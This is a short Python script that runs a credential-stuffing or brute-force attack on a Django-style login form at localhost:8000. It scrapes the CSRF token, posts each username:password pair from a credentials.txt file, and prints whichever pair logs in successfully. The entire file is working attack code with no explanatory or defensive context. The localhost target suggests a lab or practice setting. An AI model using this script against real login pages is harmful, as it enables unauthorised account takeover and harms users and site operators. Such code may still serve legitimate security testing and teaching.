from bs4 import BeautifulSoup
import requests


session = requests.Session()

url = "http://localhost:8000/login"

response = session.get(url)

login_page = response.content.decode()

soup = BeautifulSoup(login_page, 'lxml')

csrf_token_input = soup.find('input', {'name': 'csrfmiddlewaretoken'})

if csrf_token_input:
    csrf_token_value = csrf_token_input.get('value')
    with open("credentials.txt","r") as users:
        print("finding ...")
        for user in users:
            user = user.split(":")
            user[1] = user[1].replace("\n","")
            data = {
            "username":user[0],
            "password":user[1],
            "csrfmiddlewaretoken":csrf_token_value
            }
            post_response = session.post(url,data)
            if post_response.url == "http://localhost:8000/":
                print("Credentials Where Found!")
                print(f"username:{data['username']} password:{data['password']}")
                break
        else:
            print("Credentials where not found!")

